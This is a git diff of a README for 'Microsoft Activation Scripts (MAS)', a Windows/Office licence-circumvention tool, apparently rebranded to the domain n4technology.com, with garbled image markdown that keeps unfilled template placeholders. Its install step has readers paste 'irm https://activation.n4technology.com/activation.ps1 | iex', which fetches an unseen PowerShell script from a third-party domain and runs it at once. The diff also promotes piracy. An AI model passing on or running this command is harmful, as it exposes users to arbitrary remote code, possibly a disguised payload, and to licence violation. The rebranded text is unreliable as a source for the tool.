@@ -1,4 +1,4 @@
-<p align="center"><img src="[https://massgrave.dev/images/logo_small.png](https://n4technology.com/assets/img/logo.svg)" alt="MAS Logo"></p>
+<p align="center">![n4 logo]([https://github.com/[username]/[reponame]/blob/[branch]/image.jpg](https://n4technology.com/assets/img/logo.svg)?raw=true)</p>
 
 <h1 align="center">Microsoft  Activation  Scripts (MAS)</h1>
 
@@ -13,7 +13,6 @@
 -   Copy-paste the below code and press enter
     ```
     irm https://activation.n4technology.com/activation.ps1 | iex
-    
     ```
 -   You will see the activation options. Follow the on-screen instructions.
 -   That's all.
